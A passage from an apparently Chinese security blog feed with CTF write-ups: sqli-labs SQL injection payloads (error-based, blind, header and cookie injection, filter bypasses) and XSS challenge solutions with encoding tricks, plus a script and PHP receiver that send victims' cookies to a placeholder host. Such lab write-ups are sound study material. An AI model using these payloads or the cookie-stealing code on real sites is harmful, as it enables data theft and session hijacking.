floor(rand(0)*2) from users;+------------------+| floor(rand(0)*2) |+------------------+|                0 ||                1 ||                1 ||                0 ||                1 ||                1 ||                0 ||                0 ||                1 ||                1 ||                1 ||                0 ||                1 |+------------------+0110 1100</code></pre><p>再看 <code>group by</code></p><p>首先计算第一次 <code>group by</code> 后面的字段值，然后去查找有没有，没有就需要插入，插入的时候需要再计算一次</p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">参考</a></p><p>在第三次插入的时候出问题</p><p>最后的payload</p><pre><code>http://localhost/Less-5/?id=2&#39; and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+</code></pre><p><img src="/posts/70df97a2/1581062957254.png" alt></p><p>数据库也可以这样查</p><pre><code class="sql">mysql&gt; select group_concat(schema_name) from information_schema.schemata;+--------------------------------------------------------------------------------------------------------------------------------+| group_concat(schema_name)                                                                                                      |+--------------------------------------------------------------------------------------------------------------------------------+| information_schema,challenges,ctf,dvwa,ed01,mysql,newdb,performance_schema,reservation,security,sys,test,tptest,typecho,xinxiu |+--------------------------------------------------------------------------------------------------------------------------------+1 row in set</code></pre><p>简单一点的 payload</p><pre><code>http://localhost/Less-5/?id=1&#39; and (select 1 from (select count(*),  concat((select database()), floor(rand(0)*2))x from information_schema.tables group by x )a) --+</code></pre><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><p>同第五关类似</p><pre><code>http://localhost/Less-6/?id=2&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x from information_schema.tables group by x)a) --+</code></pre><p><img src="/posts/70df97a2/1581063846151.png" alt></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>是写shell，但是我没有成功(其实是因为mysql开了权限吧估计)</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><p>布尔盲注(多加一些括号)</p><pre><code class="sql">http://localhost/Less-8/?id=1&#39; and (select ascii(mid((select database()), 1,1)))=115 --+</code></pre><p><img src="/posts/70df97a2/1581064726062.png" alt></p><h2 id="第九关-延时注入"><a href="#第九关-延时注入" class="headerlink" title="第九关 延时注入"></a>第九关 延时注入</h2><p>延时注入</p><pre><code class="sql">http://localhost/Less-9/?id=1&#39; and (select  if(ascii(substr(database(),1,1))&gt;200 , sleep(5), NULL) ) --+</code></pre><p><img src="/posts/70df97a2/1581065698494.png" alt></p><h2 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h2><p>延时注入，只是换成了双引号</p><pre><code class="sql">http://localhost/Less-10/?id=1&quot; and (select if( ascii(substr(database(),1,1)) &gt; 40, sleep(5), NULL)) --+</code></pre><p><img src="/posts/70df97a2/1581065865089.png" alt></p><h2 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h2><p>POST形式的单引号</p><pre><code>uname=&amp;passwd=admin&#39; union select 1,2-- +&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581079686829.png" alt></p><h2 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h2><p>POST形式的双引号</p><p>payload(这次测试发现 <code>--+</code> 不行，需要换成 #)</p><pre><code>uname=a&amp;passwd=admin&quot;) union select 1,2# &amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581079951209.png" alt></p><h2 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h2><p>有报错回显，但是并没有其他的数据回显</p><p><img src="/posts/70df97a2/1581080112218.png" alt></p><p>payload(遇到困难加括号就行了)</p><pre><code>uname=admin&amp;passwd=admin&#39;) and (select 1 from (select count(*), concat(floor(rand(0)*2),(select database()))x from information_schema.tables group by x)a)  #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581080519639.png" alt></p><h2 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h2><p>同上一关类似</p><pre><code>uname=admin&amp;passwd=admin&quot; and (select 1 from (select count(*), concat(floor(rand(0)*2), (select database()))x  from information_schema.tables group by x)a)# &amp;submit=Submit</code></pre><h2 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h2><p>延时注入,注意只能用 <code>#</code> 注释？</p><pre><code class="sql">uname=admin&amp;passwd=admin &#39; and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081075376.png" alt="明显看到延时"></p><h2 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h2><p>同十五关</p><pre><code>uname=admin&amp;passwd=admin&quot;) and (select  if(ascii(substr(database(),1,1))&gt;30, sleep(5), NULL) ) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081206257.png" alt></p><h2 id="第十七关-报错注入"><a href="#第十七关-报错注入" class="headerlink" title="第十七关 报错注入"></a>第十七关 报错注入</h2><p>update形式的注入，这里可以使用 报错注入</p><pre><code>uname=admin&amp;passwd=admin&#39;  and (updatexml(1,concat(0x3a,(select database())),1)) #&amp;submit=Submit</code></pre><p><img src="/posts/70df97a2/1581081624347.png" alt></p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p>payload</p><pre><code class="sql">User-Agent: 1&#39; or updatexml(1,concat(0x3a,(database())),0),&#39;&#39;,&#39;&#39;)#</code></pre><p><img src="/posts/70df97a2/1581082594671.png" alt></p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>payload</p><pre><code>Referer:  1&#39; or updatexml(1,concat(0x3a,(database())),0), &#39;&#39;)#</code></pre><p>INSERT 形式的注入</p><p><img src="/posts/70df97a2/1581083050547.png" alt></p><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p>cookie形式的报错注入</p><pre><code class="sql">admin&#39; and (updatexml(1,concat(0x3a,(select database())),1)) # </code></pre><p><img src="/posts/70df97a2/1581124084727.png" alt></p><h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p>需要base64编码</p><pre><code>admin&#39; ) and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</code></pre><p>编码之后</p><pre><code>YWRtaW4nICkgYW5kICh1cGRhdGV4bWwoMSwgY29uY2F0KDB4M2EsIChzZWxlY3QgZGF0YWJhc2UoKSksMHgzYSApICwxKSkgIw==</code></pre><p><img src="/posts/70df97a2/1581124754782.png" alt></p><h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p>改成了双引号闭合</p><pre><code>admin&quot; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) #</code></pre><p>base64编码之后</p><pre><code>YWRtaW4iIGFuZCAodXBkYXRleG1sKDEsIGNvbmNhdCgweDNhLCAoc2VsZWN0IGRhdGFiYXNlKCkpLDB4M2EgKSAsMSkpICM=</code></pre><p><img src="/posts/70df97a2/1581137685241.png" alt></p><h2 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h2><p>这一次把注释符过滤了</p><p><img src="/posts/70df97a2/1581137728016.png" alt></p><pre><code class="php">$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id);</code></pre><p>报错注入可以</p><pre><code>http://localhost/Less-23/?id=1&#39; and (updatexml(1, concat(0x3a, (select database()),0x3a ) ,1)) and &#39;1&#39; =&#39;1</code></pre><p><img src="/posts/70df97a2/1581137879879.png" alt></p><h2 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h2><p>二次注入，注册一个用户名 <code>admin &#39;#</code> 就可以修改admin的密码了</p><h2 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h2><p>过滤了 <code>and</code> 和 <code>or</code> ，</p><p>可以双写绕过或者使用 <code>&amp;&amp;</code> 和 <code>||</code></p><p><img src="/posts/70df97a2/1581138060996.png" alt></p><p><img src="/posts/70df97a2/1581138112434.png" alt></p><h2 id="25a"><a href="#25a" class="headerlink" title="25a"></a>25a</h2><p>类似的过滤了and和or，而且没有单引号保护，双写绕过</p><p><img src="/posts/70df97a2/1581139222272.png" alt></p><h2 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一关-GET-Error-based-Single-quotes&quot;&gt;&lt;a href=&quot;#第一关-GET-Error-based-Single-quotes&quot; class=&quot;headerlink&quot; title=&quot;第一关 GET Error based- Singl
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="SQL" scheme="http://prontosil.com/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>XSS学习记录</title>
    <link href="http://prontosil.com/posts/88edfa78/"/>
    <id>http://prontosil.com/posts/88edfa78/</id>
    <published>2020-03-10T07:11:49.000Z</published>
    <updated>2020-03-10T07:16:09.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h2><p>(突然发现这个平台有bug，只需要在控制台alert(1)即可。。)</p><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><pre><code> http://test.ctf8.com/level1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></pre><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><pre><code> 没有找到和&amp;lt;/h2&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;h2&amp;gt;相关的结果.</code></pre><p>但是</p><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;scRipt&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level2.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scRipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=&quot;搜索&quot;/&gt; &lt;/form&gt;</code></pre><p>payload</p><pre><code> &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</code></pre><h3 id="level3-js事件绕过"><a href="#level3-js事件绕过" class="headerlink" title="level3 js事件绕过"></a>level3 js事件绕过</h3><p>这次两个都被转义了</p><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level3.php method=GET&gt; &lt;input name=keyword  value=&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>那就不用</p><pre><code> &#39;onmouseover=&#39;alert(1)</code></pre><p>提交之后鼠标悬浮到上面即可触发</p><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level4.php method=GET&gt; &lt;input name=keyword  value=&quot;scriptalert(1)/script&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>同样的绕过</p><pre><code> &quot; onmouseover=&quot;alert(1)</code></pre><h3 id="level5-a标签绕过"><a href="#level5-a标签绕过" class="headerlink" title="level5 a标签绕过"></a>level5 a标签绕过</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert(1)&lt;/script&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>但是现在会被过滤</p><pre><code>&lt;input name=keyword  value=&quot;&#39;o_nmouseover=&#39;alert(1)&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;</code></pre><p>那么事件不能用了</p><p>payload</p><pre><code>&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;</code></pre><p><img src="/posts/88edfa78/1581324449393.png" alt="img"></p><pre><code> &lt;form action=level5.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><pre><code> &lt;h2 align=center&gt;没有找到和&amp;lt;img src=x onerror=alert(1)&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;img sr_c=x o_nerror=alert(1)&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;       &lt;h2 align=center&gt;没有找到和&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;javascript:alert(1);&amp;quot;&amp;gt;aaa&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt; &lt;form action=level6.php method=GET&gt; &lt;input name=keyword  value=&quot;&quot;&gt;&lt;a hr_ef=&quot;javascript:alert(1);&quot;&gt;aaa&lt;/a&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p>payload：(大写可以绕过)</p><pre><code> &quot;&gt; &lt;a Href=&quot;javascript:alert(/1/)&quot;&gt;axxx&lt;/a&gt;</code></pre><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><pre><code> &lt;form action=level7.php method=GET&gt; &lt;input name=keyword  value=&quot;&lt;&gt;alert(1)&lt;/&gt;&quot;&gt; &lt;input type=submit name=submit value=搜索 /&gt; &lt;/form&gt;</code></pre><p><code>script</code> , <code>on</code>被过滤</p><p>payload</p><pre><code> &quot; oonninput=alert(1) &quot; &quot;oonnmouseover=&quot;alert(1)</code></pre><p>然后输入即可</p><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>将 <code>javascript:alert(1)</code>  html实体编码即可</p><pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></pre><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>将 </p><pre><code> javascript:alert(1) </code></pre><p>html实体编码，然后加上 <code>%0d</code></p><pre><code> &amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x0a;%0dhttp://www.0aa.me%0dalert(1)</code></pre><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>这一关有点玄学</p><pre><code> &amp;t_sort=&quot; type=&quot;text&quot;onmouseover=alert`1` &quot;</code></pre><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><p>添加 referer </p><pre><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><p><img src="/posts/88edfa78/1582880021264.png" alt="img"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>在User-agent 处注入</p><pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>在cookie处注入</p><pre><code> &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>iframe 引入了</p><pre><code> &lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;</code></pre><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><p>angular js</p><pre><code> http://localhost/xss_test/level15.php?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></pre><h3 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h3><p>%0a 绕过空格</p><pre><code> http://localhost/xss_test/level16.php?keyword=%3Cimg%0asrc=1%0aonerror=alert(1)%3E</code></pre><p>level17-20 都是flash相关的xss，就不写了</p><h2 id="prompt1-to-win"><a href="#prompt1-to-win" class="headerlink" title="prompt1 to win"></a>prompt1 to win</h2><p><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a></p><h3 id="0"><a href="#0" class="headerlink" title="0"></a>0</h3><pre><code> &quot;&gt;&lt;script&gt;prompt(1)&lt;/script&gt;&lt;&quot;</code></pre><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><pre><code> function escape(input) {     // tags stripping mechanism from ExtJS library     // Ext.util.Format.stripTags     var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;     input = input.replace(stripTagsRE, &#39;&#39;);      return &#39;&lt;article&gt;&#39; + input + &#39;&lt;/article&gt;&#39;; }        </code></pre><p>不能闭合标签</p><pre><code> &lt;body/onload=prompt(1)// &lt;body onload=prompt(1)//</code></pre><p><code>onload</code> 事件属性，在页面加载之后立即执行一段JavaScript</p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre><code> function escape(input) {     //                      v-- frowny face     input = input.replace(/[=(]/g, &#39;&#39;);      // ok seriously, disallows equal signs and open parenthesis     return input; }        </code></pre><p>使用svg即可</p><pre><code> &lt;svg&gt;&lt;script&gt;prompt&amp;#x28;1)&lt;/script&gt;  &lt;svg&gt;&lt;script&gt;prompt&amp;#x28 1)&lt;/script&gt;</code></pre><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre><code> function escape(input) {     // filter potential comment end delimiters     input = input.replace(/-&gt;/g, &#39;_&#39;);      // comment the input to avoid script execution     return &#39;&lt;!-- &#39; + input + &#39; --&gt;&#39;; }        </code></pre><p>新姿势get</p><pre><code> --!&gt;&lt;script&gt;prompt(1)&lt;/script</code></pre><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre><code>function escape(input) {    // make sure the script belongs to own site    // sample script: http://prompt.ml/js/test.js    if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {        var script = document.createElement(&#39;script&#39;);        script.src = input;        return script.outerHTML;    } else {        return &#39;Invalid resource.&#39;;    }}        </code></pre><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre><code>function escape(input) {    // apply strict filter rules of level 0    // filter &quot;&gt;&quot; and event handlers    input = input.replace(/&gt;|on.+?=|focus/gi, &#39;_&#39;);    return &#39;&lt;input value=&quot;&#39; + input + &#39;&quot; type=&quot;text&quot;&gt;&#39;;}      </code></pre><p>新姿势。。</p><pre><code>&quot;type=image src onerror=&quot;prompt(1)</code></pre><p>或者</p><pre><code>&quot;type=image src onerror=prompt(1) </code></pre><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre><code> function escape(input) {     // let&#39;s do a post redirection     try {         // pass in formURL#formDataJSON         // e.g. http://httpbin.org/post#{&quot;name&quot;:&quot;Matt&quot;}         var segments = input.split(&#39;#&#39;);         var formURL = segments[0];         var formData = JSON.parse(segments[1]);          var form = document.createElement(&#39;form&#39;);         form.action = formURL;         form.method = &#39;post&#39;;          for (var i in formData) {             var input = form.appendChild(document.createElement(&#39;input&#39;));             input.name = i;             input.setAttribute(&#39;value&#39;, formData[i]);         }          return form.outerHTML + &#39;                         \n\ &lt;script&gt;                                                  \n\     // forbid javascript: or vbscript: and data: stuff    \n\     if (!/script:|data:/i.test(document.forms[0].action)) \n\         document.forms[0].submit();                       \n\     else                                                  \n\         document.write(&quot;Action forbidden.&quot;)               \n\ &lt;/script&gt;                                                 \n\         &#39;;     } catch (e) {         return &#39;Invalid form data.&#39;;     } }      </code></pre><p>代码很复杂，但是其实就是一个构造表单的过程</p><p><img src="/posts/88edfa78/1582896974234.png" alt="img"></p><p>如果使用JavaScript伪协议，被过滤了</p><pre><code> javascript:prompt(1)#{&quot;test&quot;:1}</code></pre><p>新姿势：</p><p>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</p><p>所以如果输入</p><pre><code> javascript:prompt(1)#{&quot;action&quot;:1}</code></pre><p>得到的结果</p><pre><code> &lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;1&quot;&gt;&lt;/form&gt;                          &lt;script&gt;                                                       // forbid javascript: or vbscript: and data: stuff         if (!/script:|data:/i.test(document.forms[0].action))          document.forms[0].submit();                            else                                                           document.write(&quot;Action forbidden.&quot;)                &lt;/script&gt;     </code></pre><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><pre><code> function escape(input) {     // filter potential start-tags     input = input.replace(/&lt;([a-zA-Z])/g, &#39;&lt;_$1&#39;);     // use all-caps for heading     input = input.toUpperCase();      // sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!     return &#39;&lt;h1&gt;&#39; + input + &#39;&lt;/h1&gt;&#39;; }     </code></pre><p>payload如下</p><pre><code> &lt;ſcript/ſrc=//⒕₨&gt;&lt;/ſcript&gt;</code></pre><p><img src="/posts/88edfa78/1582897922738.png" alt="img"></p><h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><pre><code> function escape(input) {     // (╯°□°）╯︵ ┻━┻     input = encodeURIComponent(input).replace(/prompt/g, &#39;alert&#39;);     // ┬──┬ •ノ( ゜-゜ノ) chill out bro     input = input.replace(/&#39;/g, &#39;&#39;);      // (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO     return &#39;&lt;script&gt;&#39; + input + &#39;&lt;/script&gt; &#39;; }        </code></pre><p>组合一下。</p><pre><code> prom&#39;pt(1)</code></pre><h2 id="XSS基础知识"><a href="#XSS基础知识" class="headerlink" title="XSS基础知识"></a>XSS基础知识</h2><pre><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://xxxx/a?&quot;+escape(document.cookie);&lt;/script&gt;</code></pre><p>escape一般会进行URL编码，但是 该方法不会对 ASCII 字母和数字进行编码，也不会对下面这些 ASCII 标点符号进行编码： * @ - _ + . / 。其他所有的字符都会被转义序列替换。</p><p>常用的payload</p><pre><code> &lt;script&gt;alert(/xss/);&lt;/script&gt; //经典语句  &lt;BODY ONLOAD=alert(&#39;XSS&#39;)&gt; &lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;a href = javasript:alert(1)&gt;</code></pre><h3 id="简单地XSS接收平台"><a href="#简单地XSS接收平台" class="headerlink" title="简单地XSS接收平台"></a>简单地XSS接收平台</h3><p>js脚本</p><pre><code> var img = document.createElement(&quot;img&quot;); img.src = &quot;http://xxx/x.php?cookie=&quot;+document.cookie; document.body.appendChild(img);</code></pre><p>接收端</p><pre><code> &lt;?php   $victim = &#39;XXS得到的 cookie:&#39;. $_SERVER[&#39;REMOTE_ADDR&#39;]. &#39;:&#39; .$_GET[&#39;cookie&#39;].&quot;\r\n\r\n&quot;;   echo htmlspecialchars($_GET[&#39;cookie&#39;]); $myfile = fopen(&quot;/aixi/XSS/xss_victim.txt&quot;, &quot;a&quot;); fwrite($myfile, $victim); ?&gt;</code></pre><h3 id="从浏览器解码看xss"><a href="#从浏览器解码看xss" class="headerlink" title="从浏览器解码看xss"></a>从浏览器解码看xss</h3><h4 id="html编码解码"><a href="#html编码解码" class="headerlink" title="html编码解码"></a>html编码解码</h4><p>浏览器会先解析html，然后解析xss，所以，如果在xss中使用到了html实体编码是没有用的</p><pre><code> &lt;script&gt;alert&amp;#40;&#39;1&#39;)&lt;/script&gt;</code></pre><p>但是却可以触发，原因是 svg支持xml,在XML中实体会自动转义,除了<code>&lt;![CDATA[</code>和<code>]]&gt;</code>包含的实体</p><pre><code> &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</code></pre><h4 id="JavaScript编码解码"><a href="#JavaScript编码解码" class="headerlink" title="JavaScript编码解码"></a>JavaScript编码解码</h4><p>下面无法触发，原因是浏览器看到 <code>onerror</code> 之后，调用js解析器，但是在js中，<strong>单引号，双引号和圆括号等属于控制字符，编码后将无法识别。所以对于防御来说，应该编码这些控制字符</strong></p><pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029&gt;</code></pre><p>所以我们需要修改成这样</p><pre><code>&lt;img src=&quot;1&quot; onerror=\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)&gt;</code></pre><p>结合上面的html编码，我们可以将 <code>\u0061\u006c\u0065\u0072\u0074(&#39;\u0031&#39;)</code> 再进行一次html实体编码(这样就算你过滤了 <code>&#39;</code>,照样可以绕过)</p><pre><code>&lt;img src=&quot;1&quot; onerror=&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;&amp;#40;&amp;#39;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#51;&amp;#49;&amp;#39;&amp;#41;&gt;</code></pre><p>比如开发人员单纯的设置HTML实体编码为防御xss的手段，但是用户输入点确实在alert中</p><pre><code>&lt;img src = &quot;https://text.com&quot; onclick = &#39;alert(输入点)&#39;&gt;</code></pre><p>如果用户正常输入的话凡是存在<code>&lt;</code> ,<code>&quot;</code> 等都能被转码</p><p>但是攻击者可以通过语句<code>&quot;);alert(&quot;test</code> 然后HTML编码即可绕过</p><pre><code>&lt;img src = &quot;https://gss1.bdstatic.com&quot; onclick = &#39;alert(&quot;FIRST XSS | &amp;#34;&amp;#41;&amp;#59;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&quot;)&#39;&gt;</code></pre><p>发现弹窗了两次,是因为服务端进行一个HTML解码发现存在两个<code>alert()</code>弹窗于是直接弹</p><p>所以对于这种情况，正确防御XSS的方法应该是先javascript编码然后再进行HTML编码</p><h4 id="URL编码解码"><a href="#URL编码解码" class="headerlink" title="URL编码解码"></a>URL编码解码</h4><pre><code>&lt;a href = &quot;javascript:alert(3)&quot;&gt;hhhhh&lt;a&gt;</code></pre><p>浏览器看到<code>&lt;</code>满足HTML解码的条件，然后看到<code>href</code> 满足了URL编码额条件，最后看到<code>javascript</code>满足JS 解码的条件</p><p>于是我们可以反过来编码</p><p>作为攻击者我们应该反过来首先进行一个JS编码</p><pre><code> &lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>然后进行一个URL编码</p><pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>最后进行一个HTML编码</p><pre><code> &lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;hhhhhh&lt;/a&gt;</code></pre><p>其他栗子：</p><pre><code> &lt;a onclick=&quot;window.open(&#39;value1&#39;)&quot; href=&quot;javascript:window.open(value2)&quot;&gt;</code></pre><p>这里的value1：浏览器看到<code>&lt;</code>标签，可以HTML解码，然后看到<code>onclick</code>可以进行JS解码，最后看到<code>window.open</code>可以进行URL解码</p><p>对于value2而言：浏览器看到<code>&lt;</code>标签进行一个HTML解码，然后看到<code>href</code>进行一个URL解码，再之后看到<code>javascript</code>进行一个JS解码，最后看到了<code>window.open</code>编码进行一个URL解码</p><h3 id="XSS-payload判断是否执行练习"><a href="#XSS-payload判断是否执行练习" class="headerlink" title="XSS payload判断是否执行练习"></a>XSS payload判断是否执行练习</h3><h4 id="1-协议被编码导致无法执行"><a href="#1-协议被编码导致无法执行" class="headerlink" title="1 协议被编码导致无法执行"></a>1 协议被编码导致无法执行</h4><pre><code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></pre><p>href 丢给URL模块解析，但是协议无法识别（即被编码的<code>javascript:</code>），解码失败，不会被执行</p><h4 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h4><pre><code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;</code></pre><p>先进行htm解码得到  